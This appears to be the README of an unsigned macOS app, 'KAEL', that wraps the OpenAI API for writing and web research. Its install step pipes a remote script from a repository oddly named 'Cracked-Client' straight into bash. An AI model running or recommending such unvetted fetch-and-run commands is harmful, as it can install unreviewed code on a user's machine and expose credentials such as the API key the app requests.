# KAEL — macOS AI generation and research app

A native SwiftUI AI workbench with a direct, build-focused KAEL voice. Generate writing, brainstorm ideas, explain topics, plan projects, and write code. Research mode uses the OpenAI Responses API web-search tool and displays source links.

**Made by c0oled!**

## Install on macOS

Run this in Terminal:

```sh
curl -fL --progress-bar https://raw.githubusercontent.com/ttmeticks-source/Cracked-Client/main/install.sh | bash
```

The installer downloads the latest release, extracts it, installs `KAEL.app` into `~/Applications`, and opens it. It does not put the app on your Desktop and does not require Xcode.

## First setup

1. Open KAEL and press the gear button.
2. Add an OpenAI API key managed by a parent or guardian.
3. The default API model is `gpt-6-astra`. Change it only to a model enabled for the API project.
4. Save the key. KAEL stores it in macOS Keychain.

Never paste the key into a prompt, screenshot, or chat. Prompts are sent to the OpenAI API over HTTPS. The key stays in Keychain and is not stored in the repository or app bundle.

## Generate

Write a prompt and press **Generate**. KAEL keeps recent conversation context and responds in a concise, practical builder voice.

## Research

Switch **Research** on to require the Responses API web-search tool for that turn. KAEL returns clickable source links from URL-citation annotations and web-search source results.

See the [OpenAI web-search guide](https://developers.openai.com/api/docs/guides/tools-web-search) and [Responses API documentation](https://developers.openai.com/api/docs/guides/responses).

## Important limits and costs

KAEL is a configurable assistant interface, not an unrestricted model. The underlying model and service safeguards remain active. API usage is billed separately from a ChatGPT subscription; model input/output and web-search calls may cost money. Use an API project managed by a parent or guardian and set spending limits before use. Check [API pricing](https://openai.com/api/pricing/).

## Requirements

- macOS 13 or later
- Internet connection
- An OpenAI API key with access to the selected model and Responses API

## Build locally

```sh
swift build -c release
swift run
```

## Manual download

Open the [latest GitHub Release](https://github.com/ttmeticks-source/Cracked-Client/releases/latest) and download `KAEL-macOS.zip`.

The app is not code-signed or notarized. macOS may show a first-launch security warning.
